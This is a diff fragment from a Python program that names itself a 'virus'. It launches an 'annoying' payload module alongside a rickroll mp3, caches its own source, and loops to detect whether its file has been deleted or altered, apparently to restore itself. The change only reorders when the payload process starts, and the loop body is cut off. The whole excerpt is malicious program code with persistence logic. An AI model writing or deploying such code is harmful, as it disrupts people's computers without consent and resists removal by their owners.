@@ -8,14 +8,14 @@ sys.path.insert(1, payload_path)
 # annoying = importlib.import_module(os.path.join(payload_path, "youtube_com.py"))
 import youtube_com as annoying
 
-annoying_func_thread = Process(target=annoying.start)
-annoying_func_thread.start()
-
 chnapik_file = os.path.join(payload_path,"youtube_com-watch-dQw4w9WgXcQ.mp3")
 chnapik_file_content = open(chnapik_file, "rb").read()
 annoying_file = os.path.join(payload_path,"youtube_com.py")
 annoying_file_content = open(annoying_file, "r").read()
 virus = open(__file__, "r").read()
+
+annoying_func_thread = Process(target=annoying.start)
+annoying_func_thread.start()
 
 while True:
   if (not os.path.exists(__file__)) or open(__file__, "r").read() != virus:
